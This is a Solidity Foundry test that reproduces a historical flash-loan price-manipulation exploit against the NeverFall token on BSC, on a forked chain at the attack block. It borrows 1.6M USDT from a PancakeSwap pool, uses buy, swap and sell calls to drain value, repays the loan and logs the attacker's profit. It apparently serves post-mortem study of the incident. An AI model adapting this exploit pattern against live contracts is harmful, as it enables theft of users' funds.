// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

/*
@Analysis
https://twitter.com/BeosinAlert/status/1653619782317662211
@TX
https://bscscan.com/tx/0xccf513fa8a8ed762487a0dcfa54aa65c74285de1bc517bd68dbafa2813e4b7cb*/

interface INeverFall {
    function buy(uint256 amountU) external returns (uint256);
    function sell(uint256 amount) external returns (uint256);
}

contract ContractTest is Test {
    address neverFall = 0x5ABDe8B434133C98c36F4B21476791D95D888bF5;
    address router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address creator = 0x051d6a5f987e4fc53B458eC4f88A104356E6995a;
    address busd_usdt_pool = 0x7EFaEf62fDdCCa950418312c6C91Aef321375A00;
    address usdt = 0x55d398326f99059fF775485246999027B3197955;
    address payable pancakeRouter = payable(0x10ED43C718714eb63d5aA57B78B54704E256024E);

    function setUp() public {
        vm.createSelectFork("bsc", 27_863_178 - 1);
    }

    function testExploit() public {
        uint256 flashLoanAmount = 1_600_000 * 1e18;
        IUniswapV2Pair(busd_usdt_pool).swap(flashLoanAmount, 0, address(this), new bytes(1));
    }

    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        uint256 usdtBalance = IERC20(usdt).balanceOf(address(this));
        IERC20(usdt).approve(neverFall, type(uint256).max);
        IERC20(usdt).approve(router, type(uint256).max);
        // buy neverfall
        INeverFall(neverFall).buy(200_000 * 1e18);
        bscSwap(usdt, neverFall, 1_400_000 * 1e18);
        // sell neverfall
        INeverFall(neverFall).sell(75_500_000 * 1e18);

        IERC20(usdt).transfer(msg.sender, usdtBalance + usdtBalance * 30 / 10_000);
        emit log_named_decimal_uint("[After Attacks]  Attacker usdt balance", IERC20(usdt).balanceOf(address(this)), 18);
    }

    function bscSwap(address tokenFrom, address tokenTo, uint256 amount) internal {
        IERC20(tokenFrom).approve(pancakeRouter, type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = tokenFrom;
        path[1] = tokenTo;
        IUniswapV2Router(pancakeRouter).swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amount, 0, path, creator, block.timestamp
        );
    }
}
